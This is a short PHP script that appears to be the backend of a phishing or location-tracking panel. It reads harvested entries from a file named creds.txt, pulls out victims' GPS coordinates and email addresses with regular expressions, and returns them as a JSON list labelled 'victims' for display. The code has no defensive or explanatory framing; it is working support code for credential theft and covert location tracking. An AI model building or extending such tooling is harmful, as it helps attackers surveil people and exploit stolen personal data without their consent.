<?php
header('Content-Type: application/json');

$creds = file_get_contents('creds.txt');
$victims = [];

// Parse EXACT ton format
if (preg_match_all('/📍\s*GPS\s*POSITION\s*:\s*([^|\n]+)/', $creds, $gpsMatches) &&
    preg_match_all('/📧\s*Email\s*:\s*([^\n]+)/i', $creds, $emailMatches)) {
    
    foreach ($gpsMatches[1] as $i => $gpsStr) {
        $parts = explode(',', trim($gpsStr));
        if (count($parts) >= 2) {
            $lat = (float)$parts[0];
            $lng = (float)$parts[1];
            
            if (abs($lat) <= 90 && abs($lng) <= 180) {
                $victims[] = [
                    'id' => $i + 1,
                    'email' => $emailMatches[1][$i] ?? "victim$i",
                    'ip' => "192.168.1.".($i+1),
                    'latest' => ['lat' => $lat, 'lng' => $lng, 'time' => date('H:i:s')],
                    'positions' => [['lat' => $lat, 'lng' => $lng, 'time' => date('H:i:s')]],
                    'count' => 1
                ];
            }
        }
    }
}

// DEBUG: Affiche dans console
error_log("Victims found: " . count($victims));

echo json_encode($victims);
?>
